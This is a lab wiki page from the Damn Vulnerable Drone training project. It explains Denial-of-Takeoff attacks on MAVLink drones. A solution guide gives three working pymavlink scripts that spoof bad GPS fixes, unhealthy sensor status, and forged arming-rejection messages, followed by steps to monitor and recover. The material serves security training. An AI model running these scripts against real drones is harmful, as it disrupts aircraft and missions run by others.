<i>Preventing a drone from arming or initiating takeoff by interfering with pre-flight checks or system status reporting.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > Denial-of-Takeoff

# Description

A Denial-of-Takeoff attack involves interfering with the drone's ability to complete pre-arm checks or pass required system validations that occur before arming. MAVLink-based drones validate sensor states (GPS lock, battery voltage, RC signal, EKF health, etc.) before allowing motors to spin. By exploiting these dependencies — through spoofed or malformed messages — an attacker can deny takeoff without needing to interfere once airborne.

This type of attack is low-risk and stealthy, and may be ideal in protest scenarios, soft kill missions, or field environments where denying flight is more important than crashing the aircraft.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://ardupilot.org/copter/docs/common-prearm-checks.html">ArduPilot Pre-Arm Checks</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Approach 1: GPS Glitch Injection</h3>

<pre><code class="code mb-3 mt-3"># gps_glitch_injection.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending bad GPS data...")

    while True:
        master.mav.gps_raw_int_send(
            time_usec=int(time.time() * 1e6),
            fix_type=1,  # No usable fix
            lat=0,
            lon=0,
            alt=0,
            eph=1000,
            epv=1000,
            vel=0,
            cog=0,
            satellites_visible=0
        )
        print("[!] Spoofed bad GPS fix sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gps_glitch_injection.py &lt;target_ip:port&gt;")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
</code></pre>

---

<h3>Approach 2: Sensor Health Spoofing via SYS_STATUS</h3>

<pre><code class="code mb-3 mt-3"># sys_status_corruption.py

from pymavlink import mavutil
import time
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected to drone. Sending fake SYS_STATUS...")

    while True:
        master.mav.sys_status_send(
            onboard_control_sensors_present=0xFFFFFFFF,
            onboard_control_sensors_enabled=0xFFFFFFFF,
            onboard_control_sensors_health=0x00000000,
            load=500,
            voltage_battery=12000,
            current_battery=100,
            battery_remaining=90,
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=1,
            errors_count2=1,
            errors_count3=1,
            errors_count4=1
        )
        print("[!] Spoofed unhealthy SYS_STATUS sent")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sys_status_corruption.py &lt;target_ip:port&gt;")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
</code></pre>

---

<h3>Approach 3: Arming Rejection via COMMAND_ACK</h3>

<pre><code class="code mb-3 mt-3"># command_ack_block_arm.py

from pymavlink import mavutil
import sys

def main(target_ip, target_port):
    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    master.wait_heartbeat()
    print("Connected. Sending spoofed COMMAND_ACK to block arming...")

    master.mav.command_ack_send(
        command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        result=mavutil.mavlink.MAV_RESULT_FAILED
    )
    print("[!] Spoofed arming rejection sent")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python command_ack_block_arm.py &lt;target_ip:port&gt;")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    main(ip, int(port))
</code></pre>

---

<h3>How to Monitor</h3>

After running any of the spoofing scripts:

- Attempt to arm the drone via QGroundControl or MAVProxy
- Look for GCS messages such as:
  - <code>Pre-Arm: GPS fix required</code>
  - <code>Pre-Arm: Sensor health check failed</code>
  - <code>Command rejected by component</code>

---

<h3>How to Recover</h3>

- Reboot the drone to reset its sensor and system state  
- Cease all spoofing activity  
- Confirm GPS and sensor inputs return to normal via GCS status indicators

</details>
